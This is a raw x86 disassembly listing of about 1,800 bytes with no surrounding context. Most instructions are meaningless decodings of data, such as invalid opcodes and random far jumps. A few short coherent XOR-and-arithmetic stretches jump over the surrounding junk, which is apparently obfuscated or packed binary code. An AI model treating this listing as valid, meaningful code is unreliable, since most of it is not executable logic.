  40c80d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c80e:	loope  0x40c880
  40c810:	sub    esp,DWORD PTR [ebp-0x1c91a696]
  40c816:	mov    ss,WORD PTR [esi+0x148f7f96]
  40c81c:	pushf  
  40c81d:	fnsave [edx-0x44f87480]
  40c823:	xchg   ecx,eax
  40c824:	sub    bh,bh
  40c826:	dec    ebp
  40c827:	fdivr  QWORD PTR [ebp-0x39]
  40c82a:	mov    ecx,DWORD PTR [edx]
  40c82c:	or     DWORD PTR [edx-0x237f001c],eax
  40c832:	(bad)  
  40c833:	dec    DWORD PTR [edx]
  40c835:	mov    ebp,0x5d846a91
  40c83b:	sub    al,0xac
  40c83d:	retf   0xc652
  40c840:	div    DWORD PTR [ecx-0x6f6a6318]
  40c846:	cmp    eax,0x62e7d6b1
  40c84b:	mov    al,0xd6
  40c84d:	pusha  
  40c84e:	call   0xab09203f
  40c853:	cmp    eax,0x7c3d2351
  40c858:	in     eax,dx
  40c859:	std    
  40c85a:	mov    al,ds:0x5167b52e
  40c85f:	fdiv   QWORD PTR [edi+eax*8-0x40]
  40c863:	imul   ebp,DWORD PTR [ebp+0x571340b5],0x1a
  40c86a:	shl    al,cl
  40c86c:	jbe    0x40c84b
  40c86e:	les    ecx,FWORD PTR [esi-0x515817ff]
  40c874:	ss sbb dh,0x74
  40c878:	push   edi
  40c879:	lods   al,BYTE PTR ds:[esi]
  40c87a:	(bad)  
  40c87b:	pop    ebp
  40c87c:	mov    ebp,DWORD PTR ds:0xcdb6e28a
  40c882:	scas   al,BYTE PTR es:[edi]
  40c883:	xchg   ecx,eax
  40c884:	jmp    0x90c4:0xf727fee5
  40c88b:	repz or cl,BYTE PTR [edx]
  40c88e:	cmp    BYTE PTR [ebx],dh
  40c890:	das    
  40c891:	inc    edi
  40c892:	outs   dx,BYTE PTR ds:[esi]
  40c893:	sti    
  40c894:	(bad)  
  40c895:	jno    0x40c82c
  40c897:	pop    eax
  40c898:	adc    edi,ecx
  40c89a:	arpl   WORD PTR [esi],sp
  40c89c:	aas    
  40c89d:	mov    al,ds:0xb2fb5c0d
  40c8a2:	jmp    0x40c825
  40c8a4:	fidiv  WORD PTR [ebx-0x5b]
  40c8a7:	sub    BYTE PTR [eax+ebp*4-0x1c],ch
  40c8ab:	push   cs
  40c8ac:	jbe    0x40c8b7
  40c8ae:	push   cs
  40c8af:	cmp    eax,esp
  40c8b1:	adc    al,BYTE PTR [esi+0x2b]
  40c8b4:	sahf   
  40c8b5:	xor    eax,0xb7cca631
  40c8ba:	adc    al,0x8c
  40c8bc:	mov    ebp,eax
  40c8be:	dec    ecx
  40c8bf:	jnp    0x40c93d
  40c8c1:	or     ebx,ebp
  40c8c3:	stc    
  40c8c4:	fnstsw WORD PTR [edx]
  40c8c6:	sbb    BYTE PTR [edi],ah
  40c8c8:	mov    edi,0x444af509
  40c8cd:	ins    BYTE PTR es:[edi],dx
  40c8ce:	fst    DWORD PTR [edx+0x22]
  40c8d1:	js     0x40c8bf
  40c8d3:	xchg   ebx,eax
  40c8d4:	out    0x6,eax
  40c8d6:	pop    esi
  40c8d7:	sub    eax,DWORD PTR [edx+0x2e3da20d]
  40c8dd:	jmp    0x279d0c47
  40c8e2:	lock lea edx,[ebx+edi*4]
  40c8e6:	pop    ss
  40c8e7:	test   al,0xad
  40c8e9:	push   edi
  40c8ea:	sbb    ah,BYTE PTR [edi]
  40c8ec:	stos   DWORD PTR es:[edi],eax
  40c8ed:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	gs jl  0x40c987
  40c91b:	jmp    0x70b15e0c
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c8f7
  40c925:	fsubr  QWORD PTR [ebx+0x4b]
  40c928:	lods   al,BYTE PTR ds:[esi]
  40c929:	push   esp
  40c92a:	mov    BYTE PTR [eax],dl
  40c92c:	push   cs
  40c92d:	jnp    0x40c8b5
  40c92f:	imul   edx,edx,0x7d4abb55
  40c935:	pop    ecx
  40c936:	ins    DWORD PTR es:[edi],dx
  40c937:	push   ss
  40c938:	mov    ah,0x8b
  40c93a:	ds gs xchg ebp,eax
  40c93d:	in     al,dx
  40c93e:	xchg   esp,eax
  40c93f:	mov    dl,0x0
  40c941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c942:	std    
  40c943:	(bad)  [esp+eax*1-0x130a2816]
  40c94a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c94b:	jl     0x40c9cb
  40c94d:	sbb    bl,0xa4
  40c950:	adc    BYTE PTR [edi+0xfc7e61],0x9a
  40c957:	hlt    
  40c958:	in     al,0xba
  40c95a:	pop    ecx
  40c95b:	rcl    BYTE PTR [ebx],cl
  40c95d:	bound  esi,QWORD PTR [edx]
  40c95f:	and    eax,0xd0ae4599
  40c964:	mul    BYTE PTR [ebx+0x7c7410e2]
  40c96a:	cli    
  40c96b:	lahf   
  40c96c:	sbb    cl,BYTE PTR [eax]
  40c96e:	loope  0x40c99e
  40c970:	pushf  
  40c971:	xlat   BYTE PTR ds:[ebx]
  40c972:	clc    
  40c973:	inc    ecx
  40c974:	jmp    0x40c929
  40c976:	add    BYTE PTR [ebp-0x74],0xe0
  40c97a:	iret   
  40c97b:	outs   dx,DWORD PTR ds:[esi]
  40c97c:	ss out dx,eax
  40c97e:	(bad)
  40c981:	inc    ebx
  40c982:	dec    edx
  40c983:	arpl   si,cx
  40c985:	mov    dh,0xb5
  40c987:	lods   eax,DWORD PTR ds:[esi]
  40c988:	popf   
  40c989:	cmc    
  40c98a:	or     BYTE PTR [eax+0x4],0x10
  40c98e:	push   0x74e1d895
  40c993:	jecxz  0x40c959
  40c995:	jns    0x40ca10
  40c997:	shr    DWORD PTR [ebx+0x55],cl
  40c99a:	test   eax,0x865425df
  40c99f:	mov    ch,0x32
  40c9a1:	cmp    edx,edx
  40c9a3:	arpl   WORD PTR [edi+edx*4-0x20a865b8],si
  40c9aa:	and    al,0x76
  40c9ac:	mov    dl,BYTE PTR [edx+esi*1+0x71]
  40c9b0:	test   al,0xe8
  40c9b2:	push   ds
  40c9b3:	sbb    edi,edx
  40c9b5:	mov    ebp,0x7dfb0f0a
  40c9ba:	push   ebx
  40c9bb:	aad    0xcb
  40c9bd:	mov    bh,0xa8
  40c9bf:	and    BYTE PTR [ebx+ecx*8],0xdf
  40c9c3:	addr16 add bh,dl
  40c9c6:	sbb    BYTE PTR [ecx-0x49],0xd6
  40c9ca:	cmp    BYTE PTR [eax-0x6d],ch
  40c9cd:	inc    ecx
  40c9ce:	xchg   edx,eax
  40c9cf:	jmp    0xd5aca10e
  40c9d4:	inc    ebp
  40c9d5:	cmp    edi,ecx
  40c9d7:	add    eax,0x8971abeb
  40c9dc:	sub    bh,BYTE PTR [edi-0x4c]
  40c9df:	cmp    BYTE PTR [eax+0x16e42d74],dl
  40c9e5:	iret   
  40c9e6:	(bad)  
  40c9e7:	cmp    eax,0x2e988aae
  40c9ec:	add    ebx,DWORD PTR [eax-0x22f24e46]
  40c9f2:	(bad)  
  40c9f3:	jge    0x40c9e9
  40c9f5:	inc    eax
  40c9f6:	ret    0x416d
  40c9f9:	mov    BYTE PTR [ecx+0x53],ch
  40c9fc:	lock inc edx
  40c9fe:	test   DWORD PTR [esi],ebp
  40ca00:	xor    eax,0xdf5c102
  40ca05:	jae    0x40ca23
  40ca07:	ret    0xf7f8
  40ca0a:	or     esp,ebp
  40ca0c:	push   0x8ea4791
  40ca11:	sub    eax,0x83552fcb
  40ca16:	cmp    BYTE PTR [ebx-0x7e],0xf8
  40ca1a:	jae    0x40ca86
  40ca1c:	xor    cl,ah
  40ca1e:	sahf   
  40ca1f:	pop    es
  40ca20:	clc    
  40ca21:	in     al,dx
  40ca22:	mov    bh,0x8b
  40ca24:	icebp  
  40ca25:	push   0xffffff92
  40ca27:	adc    DWORD PTR [ebx],edx
  40ca29:	and    cl,ah
  40ca2b:	bound  ebx,QWORD PTR [ebx+edx*2]
  40ca2e:	aas    
  40ca2f:	js     0x40ca4c
  40ca31:	xor    bh,BYTE PTR [edi+0x5774a750]
  40ca37:	pop    esi
  40ca38:	es aas 
  40ca3a:	push   es
  40ca3b:	hlt    
  40ca3c:	jecxz  0x40cab6
  40ca3e:	adc    al,0x5
  40ca40:	das    
  40ca41:	mov    dl,dh
  40ca43:	(bad)  
  40ca44:	push   edi
  40ca45:	xchg   BYTE PTR [esi+0x4c0f7b83],ch
  40ca4b:	mov    edx,0xc4788785
  40ca50:	leave  
  40ca51:	aad    0xf4
  40ca53:	pop    esp
  40ca54:	call   0x76b1:0x5eba8543
  40ca5b:	js     0x40c9f1
  40ca5d:	mov    al,ds:0x993bb00e
  40ca62:	cmp    eax,0x8c0360af
  40ca67:	mov    ebp,0xf0a43451
  40ca6c:	jne    0x40c9ee
  40ca6e:	cmp    eax,DWORD PTR [eax+0x537e14b]
  40ca74:	pop    ebp
  40ca75:	in     eax,0x66
  40ca77:	add    eax,0xbc8cdd37
  40ca7c:	mov    ch,0x0
  40ca7e:	mov    dh,0x22
  40ca80:	std    
  40ca81:	je     0x40ca8b
  40ca83:	dec    ebx
  40ca84:	int3   
  40ca85:	pop    esp
  40ca86:	jmp    0x1efb:0xc6c8d5c3
  40ca8d:	retf   0xf42c
  40ca90:	icebp  
  40ca91:	add    ecx,DWORD PTR [ebx]
  40ca93:	mov    bh,0xd0
  40ca95:	pusha  
  40ca96:	mov    cl,cl
  40ca98:	or     DWORD PTR [ebx],ebx
  40ca9a:	dec    ecx
  40ca9b:	pop    esi
  40ca9c:	xchg   ebx,eax
  40ca9d:	push   es
  40ca9e:	out    0x83,al
  40caa0:	sub    al,0x3c
  40caa2:	adc    cl,al
  40caa4:	sub    BYTE PTR [edx+0x7f],cl
  40caa7:	je     0x40cb0a
  40caa9:	jmp    0x84265787
  40caae:	scas   eax,DWORD PTR es:[edi]
  40caaf:	sahf   
  40cab0:	adc    DWORD PTR [ebx],edi
  40cab2:	fs hlt 
  40cab4:	in     eax,dx
  40cab5:	int3   
  40cab6:	jecxz  0x40cb1b
  40cab8:	aad    0xa6
  40caba:	aas    
  40cabb:	mov    ah,0xa1
  40cabd:	sbb    BYTE PTR [esi+0x22],0xb
  40cac1:	xchg   edi,eax
  40cac2:	call   0xa6693c86
  40cac7:	int3   
  40cac8:	adc    ebp,esi
  40caca:	icebp  
  40cacb:	arpl   WORD PTR [esi+ebp*2-0x3b7694a8],bx
  40cad2:	sahf   
  40cad3:	xchg   ebx,esp
  40cad5:	cmc    
  40cad6:	jle    0x40ca69
  40cad8:	pop    ds
  40cad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cada:	mov    edx,0xeb137724
  40cadf:	jb     0x40caf4
  40cae1:	xor    bh,BYTE PTR es:[edx]
  40cae4:	fwait
  40cae5:	add    edi,DWORD PTR es:[ebx+0x2e]
  40cae9:	loop   0x40cb69
  40caeb:	(bad)  
  40caec:	lods   eax,DWORD PTR ds:[esi]
  40caed:	push   edx
  40caee:	aas    
  40caef:	cmp    al,0xd
  40caf1:	int3   
  40caf2:	or     BYTE PTR [ebx+0x5e],ah
  40caf5:	push   ds
  40caf6:	mov    bh,0x6e
  40caf8:	nop
  40caf9:	mov    ah,0xf7
  40cafb:	addr16 cwde 
  40cafd:	mov    eax,0xdd613320
  40cb02:	rcr    ebx,cl
  40cb04:	mov    al,ds:0x11b2d196
  40cb09:	jbe    0x40cb5e
  40cb0b:	loope  0x40caf2
  40cb0d:	mov    edx,edi
  40cb0f:	fwait
  40cb10:	or     BYTE PTR [eax],al
  40cb12:	fs int3 
  40cb14:	mov    edx,0xc6142f5c
  40cb19:	or     al,0x40
  40cb1b:	stc    
  40cb1c:	push   ss
  40cb1d:	pop    ebp
  40cb1e:	xor    ch,bl
  40cb20:	shl    al,0x22
  40cb23:	jns    0x40cb18
  40cb25:	ficomp WORD PTR [ecx]
  40cb27:	mov    ch,0x61
  40cb29:	cmp    eax,0xab290d00
  40cb2e:	dec    ebp
  40cb2f:	jmp    0xe752:0x1f131d68
  40cb36:	or     al,0x75
  40cb38:	outs   dx,BYTE PTR ds:[esi]
  40cb39:	or     DWORD PTR [ecx+0x37b88ac5],0x361b56ef
  40cb43:	sub    cl,BYTE PTR ds:0xdcbdd406
  40cb49:	adc    ah,BYTE PTR [esi+0xb]
  40cb4c:	(bad)  
  40cb4d:	sti    
  40cb4e:	pop    ds
  40cb4f:	lahf   
  40cb50:	add    al,BYTE PTR [eax]
  40cb52:	sahf   
  40cb53:	lea    esp,[esi+ebx*2]
  40cb56:	test   DWORD PTR ss:[ebp+0x534a03c0],0x8564bdf
  40cb61:	adc    eax,edi
  40cb63:	add    bl,BYTE PTR [edx-0x76]
  40cb66:	push   esp
  40cb67:	inc    esi
  40cb68:	or     ebx,DWORD PTR [ebx]
  40cb6a:	fcmovnu st,st(7)
  40cb6c:	xchg   edi,eax
  40cb6d:	arpl   WORD PTR [esi-0x6786d52a],cx
  40cb73:	xchg   edx,eax
  40cb74:	jae    0x40cbb6
  40cb76:	or     al,0xba
  40cb78:	test   esp,ecx
  40cb7a:	aam    0x11
  40cb7c:	xchg   ebx,eax
  40cb7d:	add    eax,0xb5111a58
  40cb82:	pushf  
  40cb83:	mov    fs,esi
  40cb85:	div    BYTE PTR [edx]
  40cb87:	pop    ds
  40cb88:	push   edi
  40cb89:	fwait
  40cb8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb8b:	mov    bl,0xb4
  40cb8d:	cmp    al,0x99
  40cb8f:	mov    eax,0xe12a04c0
  40cb94:	cmp    BYTE PTR [esi-0x6f],bl
  40cb97:	int    0x7b
  40cb99:	std    
  40cb9a:	test   eax,0xd429945e
  40cb9f:	and    BYTE PTR [ecx],al
  40cba1:	test   dh,ah
  40cba3:	and    BYTE PTR [ecx+0x20aa8d31],bh
  40cba9:	inc    esp
  40cbaa:	inc    esi
  40cbab:	cmc    
  40cbac:	out    dx,al
  40cbad:	test   BYTE PTR ds:0xfba4dd07,ah
  40cbb3:	mov    eax,ds:0x7369ae2c
  40cbb8:	rol    BYTE PTR [ebx-0x2497de3d],cl
  40cbbe:	sbb    BYTE PTR [ecx-0x15773dfe],0xef
  40cbc5:	or     edi,esi
  40cbc7:	mov    eax,ds:0x7ceb41ac
  40cbcc:	js     0x40cb7d
  40cbce:	cmp    eax,DWORD PTR [ebx]
  40cbd0:	push   cs
  40cbd1:	add    BYTE PTR [ebp-0x16],bl
  40cbd4:	add    ebp,edx
  40cbd6:	fnstenv [ebp+0x27d7b353]
  40cbdc:	(bad)  
  40cbde:	dec    esi
  40cbdf:	in     al,dx
  40cbe0:	and    DWORD PTR [edx-0x1f39b5d1],edx
  40cbe6:	xchg   edi,eax
  40cbe7:	pop    edx
  40cbe8:	sbb    DWORD PTR [ebp+0x545c2489],edx
  40cbee:	arpl   WORD PTR [ebp-0x6facd9db],dx
  40cbf4:	neg    cl
  40cbf6:	lahf   
  40cbf7:	(bad)  
  40cbf8:	mov    ebp,0x165b1f97
  40cbfd:	sub    ecx,esi
  40cbff:	ret    0x327
  40cc02:	mov    al,0x87
  40cc04:	sbb    DWORD PTR [edi],esp
  40cc06:	pop    ecx
  40cc07:	leave  
  40cc08:	xchg   esi,eax
  40cc09:	and    DWORD PTR [eax-0x1c196e44],edx
  40cc0f:	pop    edx
  40cc10:	dec    esp
  40cc11:	mov    bh,0x1a
  40cc13:	test   eax,0x82a36e23
  40cc18:	(bad)  
  40cc19:	ins    BYTE PTR es:[edi],dx
  40cc1a:	repz scas eax,DWORD PTR es:[edi]
  40cc1c:	push   esp
  40cc1d:	cmc    
  40cc1e:	jg     0x40cc74
  40cc20:	in     eax,0x74
  40cc22:	push   edi
  40cc23:	lods   al,BYTE PTR ds:[esi]
  40cc24:	imul   edx,DWORD PTR [esi],0x29
  40cc27:	test   al,0x14
  40cc29:	sti    
  40cc2a:	aad    0xc0
  40cc2c:	in     al,0x5e
  40cc2e:	pusha  
  40cc2f:	dec    edx
  40cc30:	mov    al,0x6a
  40cc32:	xchg   BYTE PTR [ebp+0x618e832c],ch
  40cc38:	jecxz  0x40cc7b
  40cc3a:	sbb    ch,BYTE PTR [ebx-0x4f]
  40cc3d:	jg     0x40cc9f
  40cc3f:	xor    al,0x7f
  40cc41:	popa   
  40cc42:	adc    esp,DWORD PTR [esi-0x41]
  40cc45:	or     cl,BYTE PTR [ebp-0x21d2a149]
  40cc4b:	cld    
  40cc4c:	pop    ebx
  40cc4d:	les    esi,FWORD PTR [esi]
  40cc4f:	mov    edi,0xa9491e13
  40cc54:	ins    BYTE PTR es:[edi],dx
  40cc55:	mov    al,ds:0x50d908f
  40cc5a:	fiadd  DWORD PTR [esp+ebx*1]
  40cc5d:	int3   
  40cc5e:	loop   0x40cca2
  40cc60:	push   es
  40cc61:	je     0x40cbfa
  40cc63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc64:	or     DWORD PTR [esi+0x4dc38496],eax
  40cc6a:	into   
  40cc6b:	or     ebx,edx
  40cc6d:	aad    0xd4
  40cc6f:	out    dx,eax
  40cc70:	or     al,0xe7
  40cc72:	sub    eax,0xaf0a15df
  40cc77:	mov    WORD PTR [eax-0x76cda01f],fs
  40cc7d:	inc    ecx
  40cc7e:	retf   
  40cc7f:	std    
  40cc80:	push   edx
  40cc81:	cmp    esp,DWORD PTR [ecx]
  40cc83:	lock daa 
  40cc85:	sub    DWORD PTR [edi-0x34],ebx
  40cc88:	xchg   ebp,eax
  40cc89:	mov    ch,0xdc
  40cc8b:	ret    
  40cc8c:	ins    DWORD PTR es:[edi],dx
  40cc8d:	out    dx,eax
  40cc8e:	xchg   DWORD PTR ds:0xa10e7fea,ebp
  40cc94:	fmulp  st(5),st
  40cc96:	mov    ds:0x3c14fbac,eax
  40cc9b:	into   
  40cc9c:	lock push ebx
  40cc9e:	cmc    
  40cc9f:	fs or  eax,0x9ed03b41
  40cca5:	aad    0xe2
  40cca7:	sbb    al,BYTE PTR [ebx]
  40cca9:	out    dx,eax
  40ccaa:	dec    esi
  40ccab:	popf   
  40ccac:	jno    0x40cce0
  40ccae:	xchg   ecx,eax
  40ccaf:	add    al,0xaf
  40ccb1:	mov    edi,0xef3e0cc8
  40ccb6:	neg    bh
  40ccb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccb9:	sub    dl,cl
  40ccbb:	dec    edi
  40ccbc:	inc    BYTE PTR [ecx]
  40ccbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccbf:	and    al,0xf0
  40ccc1:	xchg   edx,eax
  40ccc2:	xchg   ecx,eax
  40ccc3:	pop    ss
  40ccc4:	mov    ebp,0xd103f833
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	sub    DWORD PTR [ebx+eax*1+0x13],0x2e
  40cd1a:	or     edx,DWORD PTR [eax+0x7d9f7070]
  40cd20:	jo     0x40cd92
  40cd22:	aaa    
  40cd23:	adc    DWORD PTR [eax],esp
  40cd25:	aaa    
  40cd26:	push   es
  40cd27:	popa   
  40cd28:	xchg   BYTE PTR [edx],bl
  40cd2a:	mov    ah,0xc
  40cd2c:	pop    ebp
  40cd2d:	mov    edx,0x8196ab9e
  40cd32:	out    dx,al
  40cd33:	sub    al,0x28
  40cd35:	dec    edi
  40cd36:	mov    bh,0x1b
  40cd38:	test   eax,0x2e10891
  40cd3d:	outs   dx,DWORD PTR ds:[esi]
  40cd3e:	in     eax,dx
  40cd3f:	mov    eax,es:0x3524d63
  40cd45:	inc    edx
  40cd46:	clc    
  40cd47:	enter  0xbb7,0x89
  40cd4b:	shl    ch,1
  40cd4d:	xchg   edx,eax
  40cd4e:	jmp    FWORD PTR [edi]
  40cd50:	(bad)  
  40cd51:	mov    esp,0x6c7bcb04
  40cd56:	adc    al,0x12
  40cd58:	mov    edi,0xdb5ace7f
  40cd5d:	mov    ebx,DWORD PTR [ebp+0x12685b92]
  40cd63:	mov    WORD PTR [ecx-0x44e7bbaa],?
  40cd69:	imul   BYTE PTR [ecx]
  40cd6b:	(bad)  
  40cd6c:	std    
  40cd6d:	xor    dh,BYTE PTR [esi]
  40cd6f:	repz inc esp
  40cd71:	mov    dl,0x32
  40cd73:	dec    esi
  40cd74:	push   ds
  40cd75:	loope  0x40cda4
  40cd77:	add    al,0x35
  40cd79:	add    BYTE PTR [eax+0x6e068cc5],0x75
  40cd80:	lahf   
  40cd81:	int3   
  40cd82:	ds int 0x9d
  40cd85:	inc    esi
  40cd86:	mov    al,BYTE PTR [eax+0x44c457eb]
  40cd8c:	jbe    0x40cda9
  40cd8e:	xor    al,0x3b
  40cd90:	in     eax,0x65
  40cd92:	sbb    eax,DWORD PTR [esi]
  40cd94:	retf   
  40cd95:	xlat   BYTE PTR ds:[ebx]
  40cd96:	shl    DWORD PTR [eax+0x69],1
  40cd99:	mov    ebp,0xdcfb876c
  40cd9e:	daa    
  40cd9f:	fs jbe 0x40ce20
  40cda2:	push   edi
  40cda3:	xchg   edx,eax
  40cda4:	inc    eax
  40cda5:	mov    ecx,0x36b81be3
  40cdaa:	xchg   BYTE PTR [esi+0x6a],ah
  40cdad:	inc    edx
  40cdae:	loop   0x40cdd1
  40cdb0:	push   ecx
  40cdb1:	dec    eax
  40cdb2:	fsub   DWORD PTR [ecx-0x4ccad5d9]
  40cdb8:	out    dx,eax
  40cdb9:	sahf   
  40cdba:	cmp    eax,DWORD PTR [ebx]
  40cdbc:	mov    ds:0x98fc8d6e,eax
  40cdc1:	pop    edx
  40cdc2:	inc    edi
  40cdc3:	pop    eax
  40cdc4:	pop    edi
  40cdc5:	or     ebx,DWORD PTR [ebx]
  40cdc7:	push   ds
  40cdc8:	loope  0x40cdc6
  40cdca:	pop    eax
  40cdcb:	hlt    
  40cdcc:	fs out dx,al
  40cdce:	inc    ecx
  40cdcf:	mov    ch,0x4
  40cdd1:	in     al,0x69
  40cdd3:	mov    ecx,0x2c3e9813
  40cdd8:	cwde   
  40cdd9:	lds    edi,FWORD PTR [ebp+0x1]
  40cddc:	cmp    ch,BYTE PTR [edi-0x1]
  40cddf:	jns    0x40cd74
  40cde1:	das    
  40cde2:	sar    dh,1
  40cde4:	int3   
  40cde5:	adc    edi,DWORD PTR [ebx]
  40cde7:	jo     0x40cdcc
  40cde9:	aad    0xaa
  40cdeb:	inc    edi
  40cdec:	scas   al,BYTE PTR es:[edi]
  40cded:	int3   
  40cdee:	mov    ds:0x1871774d,eax
  40cdf3:	push   ss
  40cdf4:	jg     0x40cdc2
  40cdf6:	jmp    0xcfbd:0x46ba45dd
  40cdfd:	aad    0x38
  40cdff:	outs   dx,BYTE PTR ds:[esi]
  40ce00:	jecxz  0x40ce79
  40ce02:	stos   BYTE PTR es:[edi],al
  40ce03:	stc    
  40ce04:	jo     0x40cdf7
  40ce06:	shl    cl,1
  40ce08:	and    eax,0x165f99cd
  40ce0d:	enter  0x58a7,0x87
  40ce11:	push   ss
  40ce12:	addr16 mov eax,0x363423af
  40ce18:	inc    ecx
  40ce19:	(bad)  
  40ce1a:	call   0x57219e63
  40ce1f:	lds    ebx,FWORD PTR [edx-0x65]
  40ce22:	dec    esp
  40ce23:	into   
  40ce24:	loopne 0x40ce9f
  40ce26:	fld    TBYTE PTR [eax+eax*2]
  40ce29:	nop
  40ce2a:	arpl   WORD PTR [esi+0x54],cx
  40ce2d:	fild   WORD PTR ds:0xcacff9b9
  40ce33:	adc    eax,0xf2842ce7
  40ce38:	mov    al,ds:0x20c6f63a
  40ce3d:	lds    ebp,FWORD PTR [ecx-0x39b82162]
  40ce43:	(bad)  
  40ce44:	mov    ah,0xcf
  40ce46:	inc    edx
  40ce47:	loope  0x40ce4b
  40ce49:	aas    
  40ce4a:	loopne 0x40ce05
  40ce4c:	mov    esi,0x8c0e1b4
  40ce51:	js     0x40ce13
  40ce53:	call   0xb394:0x2668037
  40ce5a:	add    BYTE PTR [edx-0x5c],ch
  40ce5d:	and    DWORD PTR [edi+0x45],edx
  40ce60:	adc    BYTE PTR [ecx+0x69b979e6],al
  40ce66:	aaa    
  40ce67:	or     dh,ah
  40ce69:	mov    esp,0xd57a86e3
  40ce6e:	and    esp,DWORD PTR [edi+0x7a]
  40ce71:	pop    ebp
  40ce72:	cmp    DWORD PTR [edx+0x40f29c6c],eax
  40ce78:	jecxz  0x40ce4f
  40ce7a:	and    al,0xdd
  40ce7c:	adc    BYTE PTR [ecx],al
  40ce7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce7f:	xor    edx,ecx
  40ce81:	ss stos BYTE PTR es:[edi],al
  40ce83:	mov    edi,0x8a040376
  40ce88:	js     0x40ce85
  40ce8a:	xchg   ebp,eax
  40ce8b:	int3   
  40ce8c:	call   0x2836:0xcc77fd8a
  40ce93:	mov    dl,0x33
  40ce95:	sbb    ecx,DWORD PTR [ecx+0x4f]
  40ce98:	and    cl,0xdd
  40ce9b:	test   eax,0xbfe875ba
  40cea0:	(bad)  
  40cea1:	aas    
  40cea2:	je     0x40cedf
  40cea4:	cld    
  40cea5:	and    DWORD PTR [ecx],edx
  40cea7:	popa   
  40cea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cea9:	imul   edi,ecx,0x3c83909f
  40ceaf:	sbb    cl,BYTE PTR [edx]
  40ceb1:	xor    BYTE PTR [edx],bl
  40ceb3:	mov    bh,0xda
  40ceb5:	stos   DWORD PTR es:[edi],eax
  40ceb6:	mov    ecx,0xf20238d3
  40cebb:	adc    al,0xf6
  40cebd:	ja     0x40ce49
  40cebf:	push   0xffffff8b
  40cec1:	(bad)  
  40cec2:	fcmovne st,st(5)
  40cec4:	call   eax
  40cec6:	mov    al,0xa
  40cec8:	adc    al,0x69
  40ceca:	ins    DWORD PTR es:[edi],dx
  40cecb:	call   0xb634:0xd6e8fcd0
  40ced2:	cld    
  40ced3:	lods   eax,DWORD PTR ds:[esi]
  40ced4:	push   ecx
  40ced5:	mov    gs,ebp
  40ced7:	fcmovnb st,st(3)
  40ced9:	cwde   
  40ceda:	rol    DWORD PTR [ebx+0x5fa28ae],0xda
  40cee1:	pop    es
  40cee2:	xor    BYTE PTR [eax+0x742bcd08],dh
  40cee8:	pop    DWORD PTR [edx]
  40ceea:	clc    
  40ceeb:	arpl   ax,sp
  40ceed:	int3   
  40ceee:	push   edx
  40ceef:	test   DWORD PTR [edi-0x1d],esi
  40cef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cef3:	ror    DWORD PTR [edx-0x45e6b6f0],cl
  40cef9:	ret    
  40cefa:	cmc    
  40cefb:	mov    ecx,0x7524e5ec
  40cf00:	jl     0x40cf6f
  40cf02:	xor    eax,0x4b40ed01
  40cf07:	hlt    
  40cf08:	lods   al,BYTE PTR ds:[esi]
  40cf09:	inc    eax
  40cf0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf0b:	jge    0x40cea4
  40cf0d:	lahf   
  40cf0e:	psubb  mm6,QWORD PTR [ebp-0x3]
  40cf12:	popf   
  40cf13:	dec    esp
  40cf14:	gs mov ebx,0x781a6dac
  40cf1a:	and    BYTE PTR [ebx-0x22],cl
  40cf1d:	mov    ch,0x19
  40cf1f:	or     al,0x8b
  40cf21:	fisttp WORD PTR [edx-0x1f6a6ad1]
  40cf27:	dec    eax
  40cf28:	inc    eax
  40cf29:	pop    ebp
  40cf2a:	aad    0x2f
  40cf2c:	add    eax,0xc3306813
  40cf31:	out    dx,al
  40cf32:	pusha  
  40cf33:	test   eax,0x70359996
  40cf38:	pop    es
  40cf39:	ret    
  40cf3a:	call   0x4ef168a6
  40cf3f:	adc    eax,0xa9cfa72d
  40cf44:	mov    bh,0x29
  40cf46:	mov    edi,0xb70001d1
  40cf4b:	pushf  
  40cf4c:	sub    dh,dh
  40cf4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
